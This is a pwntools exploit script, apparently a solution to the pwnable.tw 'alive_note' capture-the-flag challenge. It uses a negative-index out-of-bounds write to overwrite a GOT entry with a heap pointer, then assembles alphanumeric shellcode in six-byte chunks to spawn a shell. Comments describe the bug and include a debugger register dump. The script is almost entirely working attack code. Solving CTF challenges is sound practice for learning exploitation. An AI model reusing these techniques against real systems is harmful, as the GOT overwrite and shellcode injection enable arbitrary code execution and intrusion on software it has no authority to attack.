from curses.ascii import isalnum
from pwn import *
import time
## !!!!!!!!!!!!! local environ only stack nas rwx but remote has rwx at heap
## input a negative number to atoi() will cause oob, and note address is at .bss section
## so we can overwrite got table with heap address using add function to call shellcode

r = process("./alive_note")
#r = remote('chall.pwnable.tw',10300)
context.arch='i386'

### register when shellcode execute
# $eax   : 0xffffffe8
# $ebx   : 0x0
# $ecx   : 0x0
# $edx   : 0x9a7e1a0  →  0x005a6a ("jZ"?)
# $esp   : 0xffb7f06c  →  0x804886b  →  <add_note+165> add esp, 0x10
# $ebp   : 0xffb7f098  →  0xffb7f0a8  →  0x00000000
# $esi   : 0xf7f57000  →  0x001ead6c
# $edi   : 0xf7f57000  →  0x001ead6c
# 0xffbf485c│+0x0000: 0x804886b  →  <add_note+165> add esp, 0x10   ← $esp
# 0xffbf4860│+0x0004: 0x8048b4a  →  "Done !"
# 0xffbf4864│+0x0008: 0x00000008
# 0xffbf4868│+0x000c: 0xffbf4888  →  0xffbf4898  →  0x00000000
# 0xffbf486c│+0x0010: 0x80487ec  →  <add_note+38> mov DWORD PTR [ebp-0x18], eax
# 0xffbf4870│+0x0014: 0xffffffe8
# 0xffbf4874│+0x0018: 0xf7005a6a ("jZ"?)
# 0xffbf4878│+0x001c: 0xffbf4898  →  0x00000000


def delete(idx):
    r.sendafter(b'Your choice :',b'3')
    r.sendafter(b'Index :',str(idx))

def add(idx,name):
    r.sendafter(b'Your choice :',b'1')
    r.sendafter(b'Index :',str(idx))
    r.sendafter(b'Name :',name)

def inject(idx,code):
    payload = asm(code) 
    code_len = len(payload)
    if len(payload) > 6 :
        print(f'len error')
        print(f'ERROR CODE : {code}')
        raise 
    if not payload.decode().isalnum() :
        print(f'not alnum')
        print(f'ERROR CODE : {code}')
        raise

    payload += b'\x75'
    jmp_addr = 0x40 + (0x10 - 2 - code_len) 
    payload += int.to_bytes(jmp_addr,1,'little')
    payload = payload.ljust(0x8,b'\x00')

    add(idx,payload)
    for i in range(4):
        add(1,b'\x00')
    
    time.sleep(0.1)

add(0,b'1\x00')   ## 1a0    inject(-23,'push edx ; pop ecx ; push eax ; push edx ; pop eax')
add(1,b'1')
add(1,b'2')
add(1,b'3')
add(1,b'3')
## set up ecx to buf and edx to offset 0x490

inject(1,'xor ax, 0x6756')
inject(1,'xor ax, 0x6266 ; push eax ; pop edx')

### 0xffe8 ^ 0x4f68 ^ 0x304d = 0x80cd 
inject(1,'pop eax ; xor ax, 0x304d')
inject(1,'xor ax, 0x4f68')   
inject(1,'xor word ptr [edx+0x30], ax ')
inject(1,'push 0x33 ; pop eax ; xor al, 0x30')
inject(1,'push edx ; pop ecx ; ') 
inject(1,'push 0x7a ; pop edx')   
inject(1,'inc edx')   ### 470



r.clean(0)
#input()
add(2,b'\x00')

delete(0)
input()
inject(-24,'push eax ; push edx ; pop eax')
# 1a0
#r.sendline(b'\x42'*0x32 +  asm(shellcraft.sh()))
r.interactive()